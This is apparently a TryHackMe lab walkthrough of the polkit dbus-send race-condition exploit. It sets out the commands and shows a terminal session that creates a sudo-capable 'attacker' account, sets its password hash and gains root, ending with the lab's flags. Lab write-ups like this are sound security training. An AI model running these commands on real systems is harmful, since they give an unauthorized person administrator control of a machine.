
Generate the sha512crypt password hash:

	openssl passwd -6 Expl01ted

Use this hash for adding password to newly added account via exploiting polkit using manual D-bus daemon messages.

To Create new user:
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:<USERNAME> string:"<ACCOUNT DESCRIPTION>" int32:1 & sleep 0.005s; kill $!

To set user password:
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User<USERID> org.freedesktop.Accounts.User.SetPassword string:'<HASH>' string:'<DESCRIPTION>' & sleep 0.005s; kill $!


Real Cmds:


tryhackme@polkit:~$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freede
sktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!                                        
[1] 1142

tryhackme@polkit:~$ openssl passwd -6 Expl01ted                        
$6$bWH/dZ3NFA8eUYH5$gZyc/Ccy2YYnTiJtT2RamxOn8X8/1j2ACJuT/fAtzUmBedSZ/Ekud.0kmGY1sjENn5b.uQigiHm.I5lP9BjPj.
tryhackme@polkit:~$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 o
rg.freedesktop.Accounts.User.SetPassword string:'$6$bWH/dZ3NFA8eUYH5$gZyc/Ccy2YYnTiJtT2RamxOn8X8/1j2ACJuT/fAtzUmBedSZ/Ekud.0kmGY1sjENn5b.uQi
giHm.I5lP9BjPj.' string:'Ask the pentester' & sleep 0.005s; kill $!
[1] 1202
tryhackme@polkit:~$ 
[1]+  Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/
User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$bWH/dZ3NFA8eUYH5$gZyc/Ccy2YYnTiJtT2RamxOn8X8/1j2ACJuT/fAtzUmBedSZ/Ekud.0kmGY1s
jENn5b.uQigiHm.I5lP9BjPj.' string:'Ask the pentester'
tryhackme@polkit:~$ su attacker                                        
Password: 
To run a command as administrator (user "root"), use "sudo <command>". 
See "man sudo_root" for details.

attacker@polkit:/home/tryhackme$ sudo -l
[sudo] password for attacker: 
Matching Defaults entries for attacker on polkit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User attacker may run the following commands on polkit:
    (ALL : ALL) ALL


Lets get the root flag

Got dynamic flag : 

	bU8pslB+spc=-qhkq2Vn5LXtqtstC-47ghcXRkk/FqHlcMwA6orCaEjLG9pp3fk/S/wTrf/SXWgkXbfKz9vg==

Submit it on : https://flag.muir.land/.

Got THM flag:

	THM{N2I0MTgzZTE4ZWQ0OGY0NjdiNTQ0NTZi}
